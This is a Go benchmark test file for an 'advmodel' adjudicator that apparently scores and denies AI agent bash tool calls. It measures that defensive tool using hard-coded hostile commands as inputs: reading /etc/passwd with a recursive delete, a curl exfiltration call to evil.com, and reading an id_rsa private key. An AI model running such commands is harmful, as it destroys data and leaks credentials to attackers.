package advmodel_test

import (
	"bytes"
	"context"
	"os"
	"testing"

	"github.com/anthony-chaudhary/fak/internal/abi"
	"github.com/anthony-chaudhary/fak/internal/advmodel"
)

func BenchmarkTokens(b *testing.B) {
	tool := "bash"
	args := []byte(`{"command": "cat /etc/passwd && rm -rf /tmp/data"}`)

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		_ = advmodel.Tokens(tool, args)
	}
}

func BenchmarkArtifactScoreAndDenies(b *testing.B) {
	art, err := advmodel.Load("testdata/adjudicator.json")
	if err != nil {
		b.Fatalf("failed to load artifact: %v", err)
	}

	tool := "bash"
	args := []byte(`{"command": "curl http://evil.com/exfil"}`)

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		_ = art.Score(tool, args)
		_ = art.Denies(tool, args)
	}
}

func BenchmarkAdjudicate(b *testing.B) {
	art, err := advmodel.Load("testdata/adjudicator.json")
	if err != nil {
		b.Fatalf("failed to load artifact: %v", err)
	}
	adj := advmodel.NewAdjudicator(art)
	ctx := context.Background()
	call := &abi.ToolCall{
		Tool: "bash",
		Args: abi.Ref{
			Kind:   abi.RefInline,
			Inline: []byte(`{"command": "cat id_rsa"}`),
		},
	}

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		_ = adj.Adjudicate(ctx, call)
	}
}

func BenchmarkLoadCorpus(b *testing.B) {
	data, err := os.ReadFile("testdata/corpus.jsonl")
	if err != nil {
		b.Fatalf("failed to read corpus file: %v", err)
	}

	b.ResetTimer()
	b.ReportAllocs()
	for i := 0; i < b.N; i++ {
		rows, err := advmodel.LoadCorpus(bytes.NewReader(data))
		if err != nil {
			b.Fatalf("LoadCorpus failed: %v", err)
		}
		if len(rows) == 0 {
			b.Fatal("unexpected empty corpus")
		}
	}
}
